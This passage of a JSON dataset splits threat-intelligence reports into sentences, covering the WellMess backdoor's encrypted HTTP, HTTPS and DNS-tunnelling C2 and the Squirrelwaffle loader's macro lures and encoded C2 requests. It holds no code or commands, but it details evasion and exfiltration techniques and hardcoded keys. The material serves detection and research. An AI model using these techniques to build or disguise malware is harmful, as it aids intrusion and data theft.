        "line": 5,
        "index": 1453
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S6",
        "text": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "type": "",
        "report": "r-527",
        "line": 6,
        "index": 1454
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S7",
        "text": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "type": "",
        "report": "r-527",
        "line": 7,
        "index": 1455
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S8",
        "text": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "type": "",
        "report": "r-527",
        "line": 8,
        "index": 1456
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S9",
        "text": "The three methods are: HTTP, HTTPS, DNS\n",
        "type": "",
        "report": "r-527",
        "line": 9,
        "index": 1457
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S10",
        "text": "In this sample the DNS communication method is not enabled; however, the method has been documented for completeness as the functionality is present in the malware.\n",
        "type": "",
        "report": "r-527",
        "line": 10,
        "index": 1458
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S11",
        "text": "For each communication method the malware follows a similar process; it establishes a connection with the C2 and then enters an infinite loop to exchange data.",
        "type": "",
        "report": "r-527",
        "line": 11,
        "index": 1459
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S12",
        "text": "The details of the initial connection differ for each method but the main loop that exchanges data uses the same functions to carry out malicious functionality.\n",
        "type": "",
        "report": "r-527",
        "line": 12,
        "index": 1460
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S13",
        "text": "The HTTP mode is the same communication method used in variants of the malware from 2018.",
        "type": "",
        "report": "r-527",
        "line": 13,
        "index": 1461
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S14",
        "text": "Although it uses the non-encrypted HTTP protocol to communicate with the C2 it manually encrypts the contents of the requests to hide data from packet inspection.",
        "type": "",
        "report": "r-527",
        "line": 14,
        "index": 1462
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S15",
        "text": "The malware creates an AES session key and initial value (as detailed in Appendix C) which are base64 encoded, appended to each other with a \\n separator.",
        "type": "",
        "report": "r-527",
        "line": 15,
        "index": 1463
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S16",
        "text": "Once appended, it is further encrypted with a hardcoded RSA public key and base64 encoded again and obfuscated before being sent to the C2 as the body of a POST request.",
        "type": "",
        "report": "r-527",
        "line": 16,
        "index": 1464
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S17",
        "text": "The obfuscation routine used on the final base64 data removes and replaces characters in the base64 string, according to Table 1:\n",
        "type": "",
        "report": "r-527",
        "line": 17,
        "index": 1465
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S18",
        "text": "The string is then chopped into randomly chosen 3-8 character chunks and each chunk is separated with a single space.",
        "type": "",
        "report": "r-527",
        "line": 18,
        "index": 1466
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S19",
        "text": "The final string is then set as the content of a HTTP POST request to the hardcoded IP and port present in the malware.",
        "type": "",
        "report": "r-527",
        "line": 19,
        "index": 1467
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S20",
        "text": "The POST request also creates an obfuscated cookie to include in the POST request.",
        "type": "",
        "report": "r-527",
        "line": 20,
        "index": 1468
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S21",
        "text": "The cookie is a string consisting of tags that contain information about the malware which is then RC6 encrypted with a hardcoded key, base64 encoded and split into random sized chunks.",
        "type": "",
        "report": "r-527",
        "line": 21,
        "index": 1469
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S22",
        "text": "The first cookie sent to the C2 includes the previously generated MD5 session hash and has the following format before encryption:\n",
        "type": "",
        "report": "r-527",
        "line": 22,
        "index": 1470
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S23",
        "text": "Encrypted cookies generated by the malware can be decrypted with a script[3] provided by JPCERT, so long as the RC6 key has been obtained for the sample that generated the cookie.",
        "type": "",
        "report": "r-527",
        "line": 23,
        "index": 1471
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S24",
        "text": "Once the AES key and IV have been sent to the C2 the malware sends the userParameters string and the saved MD5 hash separated by a newline character in the same way.",
        "type": "",
        "report": "r-527",
        "line": 24,
        "index": 1472
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S25",
        "text": "The only difference from the previous send is that the <;title;> tag contains the string a:1_1 this time.\n",
        "type": "",
        "report": "r-527",
        "line": 25,
        "index": 1473
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S26",
        "text": "After the initial connection to the C2 has been established, the malware will repeatedly attempt to receive a command from the C2.",
        "type": "",
        "report": "r-527",
        "line": 26,
        "index": 1474
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S27",
        "text": "The communications follow the pattern shown in Figure 2.\n",
        "type": "",
        "report": "r-527",
        "line": 27,
        "index": 1475
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S28",
        "text": "The 2398 random bytes of data are base64 encoded and then obfuscated as detailed previously in Table 1.",
        "type": "",
        "report": "r-527",
        "line": 28,
        "index": 1476
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S29",
        "text": "This data is then sent to the C2 with an RC6 encrypted cookie with the <;head;> tag containing the MD5 session hash value, the <;title;> tag containing the string rc and the <;service;> tag being present but empty.",
        "type": "",
        "report": "r-527",
        "line": 29,
        "index": 1477
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S30",
        "text": "The malware expects the server to respond with a HTTP 200 OK response that contains an RC6 encrypted cookie in a similar format to the sent cookie.",
        "type": "",
        "report": "r-527",
        "line": 30,
        "index": 1478
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S31",
        "text": "This is checked in the malware by parsing the received cookie data according to the following regex which also matches the format of the sent cookie data.",
        "type": "",
        "report": "r-527",
        "line": 31,
        "index": 1479
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S32",
        "text": "The cookie is used by the malware to determine what type of command has been received from the C2; Table 2 summarises the possible options.\n",
        "type": "",
        "report": "r-527",
        "line": 32,
        "index": 1480
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S33",
        "text": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "type": "",
        "report": "r-527",
        "line": 33,
        "index": 1481
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S34",
        "text": "A value of G in the head tag will make the malware send the string \u201cMissed me? Interval=\u201d with the currently configured value that is used by the malware to calculate wait intervals when receiving this command.",
        "type": "",
        "report": "r-527",
        "line": 34,
        "index": 1482
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S35",
        "text": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "type": "",
        "report": "r-527",
        "line": 35,
        "index": 1483
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S36",
        "text": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "type": "",
        "report": "r-527",
        "line": 36,
        "index": 1484
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S37",
        "text": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "type": "",
        "report": "r-527",
        "line": 37,
        "index": 1485
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S38",
        "text": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "type": "",
        "report": "r-527",
        "line": 38,
        "index": 1486
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S39",
        "text": "The data in the content section is converted from the obfuscated format detailed in Table 1, base64 decoded and then decrypted using the AES key that was previously sent to the C2.",
        "type": "",
        "report": "r-527",
        "line": 39,
        "index": 1487
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S40",
        "text": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "type": "",
        "report": "r-527",
        "line": 40,
        "index": 1488
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S41",
        "text": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "type": "",
        "report": "r-527",
        "line": 41,
        "index": 1489
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S42",
        "text": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "type": "",
        "report": "r-527",
        "line": 42,
        "index": 1490
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S43",
        "text": "The service tag is expected to be in the following format:\n",
        "type": "",
        "report": "r-527",
        "line": 43,
        "index": 1491
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S44",
        "text": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "type": "",
        "report": "r-527",
        "line": 44,
        "index": 1492
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S45",
        "text": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "type": "",
        "report": "r-527",
        "line": 45,
        "index": 1493
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S46",
        "text": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.\n",
        "type": "",
        "report": "r-527",
        "line": 46,
        "index": 1494
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S47",
        "text": "The pr command also utilises the \u2018|\u2019 as a separator with each protocol separated by the symbol.",
        "type": "",
        "report": "r-527",
        "line": 47,
        "index": 1495
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S48",
        "text": "An example service tag that would enable all of the communication methods in the sample analysed would be:\n",
        "type": "",
        "report": "r-527",
        "line": 48,
        "index": 1496
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S49",
        "text": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "type": "",
        "report": "r-527",
        "line": 49,
        "index": 1497
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S50",
        "text": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "type": "",
        "report": "r-527",
        "line": 50,
        "index": 1498
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S51",
        "text": "This method for running commands is slightly different from the older .NET variants of the backdoor which additionally supported running scripts via PowerShell.\n",
        "type": "",
        "report": "r-527",
        "line": 51,
        "index": 1499
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S52",
        "text": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "type": "",
        "report": "r-527",
        "line": 52,
        "index": 1500
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S53",
        "text": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "type": "",
        "report": "r-527",
        "line": 53,
        "index": 1501
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S54",
        "text": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "type": "",
        "report": "r-527",
        "line": 54,
        "index": 1502
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S55",
        "text": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "type": "",
        "report": "r-527",
        "line": 55,
        "index": 1503
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S56",
        "text": "However, the title tag has just the character a rather than a:1_1 that is used for the HTTP beacon.",
        "type": "",
        "report": "r-527",
        "line": 56,
        "index": 1504
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S57",
        "text": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "type": "",
        "report": "r-527",
        "line": 57,
        "index": 1505
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S58",
        "text": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.\n",
        "type": "",
        "report": "r-527",
        "line": 58,
        "index": 1506
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S59",
        "text": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "type": "",
        "report": "r-527",
        "line": 59,
        "index": 1507
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S60",
        "text": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "type": "",
        "report": "r-527",
        "line": 60,
        "index": 1508
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S61",
        "text": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.\n",
        "type": "",
        "report": "r-527",
        "line": 61,
        "index": 1509
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S62",
        "text": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "type": "",
        "report": "r-527",
        "line": 62,
        "index": 1510
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S63",
        "text": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "type": "",
        "report": "r-527",
        "line": 63,
        "index": 1511
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S64",
        "text": "The format of the C2 url string for the example in Figure 3 would be one of:\n",
        "type": "",
        "report": "r-527",
        "line": 64,
        "index": 1512
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S65",
        "text": "This pattern can be used to identify numerous samples of the WellMess backdoor.\n",
        "type": "",
        "report": "r-527",
        "line": 65,
        "index": 1513
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S66",
        "text": "The DNS communication protocol is significantly different to the previous two modes.",
        "type": "",
        "report": "r-527",
        "line": 66,
        "index": 1514
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S67",
        "text": "Data is sent to the C2 by DNS tunnelling.",
        "type": "",
        "report": "r-527",
        "line": 67,
        "index": 1515
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S68",
        "text": "This involves prepending encoded data as a sub domain to a threat actor-controlled domain and then using DNS requests to transmit this data to the C2 with other DNS resolution services forwarding on the message.",
        "type": "",
        "report": "r-527",
        "line": 68,
        "index": 1516
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S69",
        "text": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "type": "",
        "report": "r-527",
        "line": 69,
        "index": 1517
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S70",
        "text": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "type": "",
        "report": "r-527",
        "line": 70,
        "index": 1518
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S71",
        "text": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "type": "",
        "report": "r-527",
        "line": 71,
        "index": 1519
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S72",
        "text": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "type": "",
        "report": "r-527",
        "line": 72,
        "index": 1520
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S73",
        "text": "The DNS method builds a URL string by splitting the encoded string into four parts of random length, separating each with a period.",
        "type": "",
        "report": "r-527",
        "line": 73,
        "index": 1521
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S74",
        "text": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "type": "",
        "report": "r-527",
        "line": 74,
        "index": 1522
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S75",
        "text": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "type": "",
        "report": "r-527",
        "line": 75,
        "index": 1523
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S76",
        "text": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "type": "",
        "report": "r-527",
        "line": 76,
        "index": 1524
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S77",
        "text": "If the result of the manipulation of the MD5 hash gave the string abcdefg12345, the resulting period separated string could end up being something like .ab.cde.fg12.245.",
        "type": "",
        "report": "r-527",
        "line": 77,
        "index": 1525
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S78",
        "text": "Each chunk can have a maximum length of 12 characters.\n",
        "type": "",
        "report": "r-527",
        "line": 78,
        "index": 1526
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S79",
        "text": "The previously encoded four-part message then has the command of this operation appended to it, in the initial beacon\u2019s case the command is id.",
        "type": "",
        "report": "r-527",
        "line": 79,
        "index": 1527
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S80",
        "text": "That then has the MD5 string appended to it followed by the malicious domain.",
        "type": "",
        "report": "r-527",
        "line": 80,
        "index": 1528
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S81",
        "text": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "type": "",
        "report": "r-527",
        "line": 81,
        "index": 1529
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S82",
        "text": "A couple of example strings with sections bolded to show the boundaries are included below to demonstrate the encoding:\n",
        "type": "",
        "report": "r-527",
        "line": 82,
        "index": 1530
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S83",
        "text": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "type": "",
        "report": "r-527",
        "line": 83,
        "index": 1531
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S84",
        "text": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "type": "",
        "report": "r-527",
        "line": 84,
        "index": 1532
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S85",
        "text": "It will then append the previously generated time string after separating it into four separate chunks.",
        "type": "",
        "report": "r-527",
        "line": 85,
        "index": 1533
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S86",
        "text": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "type": "",
        "report": "r-527",
        "line": 86,
        "index": 1534
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S87",
        "text": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.\n",
        "type": "",
        "report": "r-527",
        "line": 87,
        "index": 1535
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S88",
        "text": "The response is expected to contain three TXT records.",
        "type": "",
        "report": "r-527",
        "line": 88,
        "index": 1536
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S89",
        "text": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "type": "",
        "report": "r-527",
        "line": 89,
        "index": 1537
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S90",
        "text": "These commands operate in the same way described previously.",
        "type": "",
        "report": "r-527",
        "line": 90,
        "index": 1538
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S91",
        "text": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "type": "",
        "report": "r-527",
        "line": 91,
        "index": 1539
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S92",
        "text": "The commands expected in this data are either the pr command, as previously described, or a com command.",
        "type": "",
        "report": "r-527",
        "line": 92,
        "index": 1540
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S93",
        "text": "The com option calls the same functions as the default case in the HTTP and HTTPS modes which allows the malware to run a cmd shell but then exfiltrates the output via DNS A records.",
        "type": "",
        "report": "r-527",
        "line": 93,
        "index": 1541
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S0",
        "text": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.",
        "type": "",
        "report": "r-558",
        "line": 0,
        "index": 1542
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S1",
        "text": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.",
        "type": "",
        "report": "r-558",
        "line": 1,
        "index": 1543
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S2",
        "text": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.",
        "type": "",
        "report": "r-558",
        "line": 2,
        "index": 1544
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S3",
        "text": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.\n",
        "type": "",
        "report": "r-558",
        "line": 3,
        "index": 1545
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S4",
        "text": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.\n",
        "type": "",
        "report": "r-558",
        "line": 4,
        "index": 1546
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S5",
        "text": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "type": "",
        "report": "r-558",
        "line": 5,
        "index": 1547
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S6",
        "text": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.",
        "type": "",
        "report": "r-558",
        "line": 6,
        "index": 1548
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S7",
        "text": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "type": "",
        "report": "r-558",
        "line": 7,
        "index": 1549
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S8",
        "text": "Here, the AutoOpen() subroutine calls another function efile() in the bxh module.",
        "type": "",
        "report": "r-558",
        "line": 8,
        "index": 1550
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S9",
        "text": "There is a UserForm object in the document which contains a VBS file named pin.vbs that is embedded in the caption of the DocuSign image.",
        "type": "",
        "report": "r-558",
        "line": 9,
        "index": 1551
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S10",
        "text": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "type": "",
        "report": "r-558",
        "line": 10,
        "index": 1552
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S11",
        "text": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "type": "",
        "report": "r-558",
        "line": 11,
        "index": 1553
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S12",
        "text": "The payload is written to %ProgramData% with the filename ww1.dll.\n",
        "type": "",
        "report": "r-558",
        "line": 12,
        "index": 1554
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S13",
        "text": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "type": "",
        "report": "r-558",
        "line": 13,
        "index": 1555
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S14",
        "text": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.\n",
        "type": "",
        "report": "r-558",
        "line": 14,
        "index": 1556
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S15",
        "text": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 15,
        "index": 1557
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S16",
        "text": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "type": "",
        "report": "r-558",
        "line": 16,
        "index": 1558
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S17",
        "text": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "type": "",
        "report": "r-558",
        "line": 17,
        "index": 1559
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S18",
        "text": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "type": "",
        "report": "r-558",
        "line": 18,
        "index": 1560
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S19",
        "text": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.\n",
        "type": "",
        "report": "r-558",
        "line": 19,
        "index": 1561
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S20",
        "text": "The hidden sheet in this Excel document is shown in Figure 7.\n",
        "type": "",
        "report": "r-558",
        "line": 20,
        "index": 1562
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S21",
        "text": "The extracted macro code is shown in Figure 8.\n",
        "type": "",
        "report": "r-558",
        "line": 21,
        "index": 1563
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S22",
        "text": "The threat actor also changed the location where the payload is written to disk.",
        "type": "",
        "report": "r-558",
        "line": 22,
        "index": 1564
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S23",
        "text": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 23,
        "index": 1565
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S24",
        "text": "This analysis covers the Squirrelwaffle with the MD5 hash 479DAE0F72F4D57BD20E0BF8CB3EBDF7.",
        "type": "",
        "report": "r-558",
        "line": 24,
        "index": 1566
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S25",
        "text": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "type": "",
        "report": "r-558",
        "line": 25,
        "index": 1567
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S26",
        "text": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.\n",
        "type": "",
        "report": "r-558",
        "line": 26,
        "index": 1568
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S27",
        "text": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "type": "",
        "report": "r-558",
        "line": 27,
        "index": 1569
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S28",
        "text": "Similar packers have been observed in other malware families including Ursnif and Zloader.\n",
        "type": "",
        "report": "r-558",
        "line": 28,
        "index": 1570
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S29",
        "text": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "type": "",
        "report": "r-558",
        "line": 29,
        "index": 1571
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S30",
        "text": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.",
        "type": "",
        "report": "r-558",
        "line": 30,
        "index": 1572
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S31",
        "text": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.",
        "type": "",
        "report": "r-558",
        "line": 31,
        "index": 1573
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S32",
        "text": "An example formatted Squirrelwaffle configuration is shown in Figure 10.\n",
        "type": "",
        "report": "r-558",
        "line": 32,
        "index": 1574
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S33",
        "text": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a socket and sends the data using the send() function and receives the content from the CnC using recv() calls.",
        "type": "",
        "report": "r-558",
        "line": 33,
        "index": 1575
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S34",
        "text": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key KJKLO.",
        "type": "",
        "report": "r-558",
        "line": 34,
        "index": 1576
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S35",
        "text": "An example HTTP POST request is shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 35,
        "index": 1577
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S36",
        "text": "Note that this request does not contain a User-Agent field in the HTTP header.\n",
        "type": "",
        "report": "r-558",
        "line": 36,
        "index": 1578
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S37",
        "text": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "type": "",
        "report": "r-558",
        "line": 37,
        "index": 1579
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S38",
        "text": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "type": "",
        "report": "r-558",
        "line": 38,
        "index": 1580
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S39",
        "text": "Each field is delimited by a single tab character.",
        "type": "",
        "report": "r-558",
        "line": 39,
        "index": 1581
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S40",
        "text": "An example before encryption is shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 40,
        "index": 1582
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S41",
        "text": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "type": "",
        "report": "r-558",
        "line": 41,
        "index": 1583
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S42",
        "text": "Each field is delimited with two tab characters.",
        "type": "",
        "report": "r-558",
        "line": 42,
        "index": 1584
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S43",
        "text": "An example payload before encryption is shown below:\n",
        "type": "",
        "report": "r-558",
        "line": 43,
        "index": 1585
    },
    {
        "id": "cti_reports_filtered/r-558.md:::S44",
        "text": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.\n",
        "type": "",
        "report": "r-558",
        "line": 44,
        "index": 1586
    },
    {
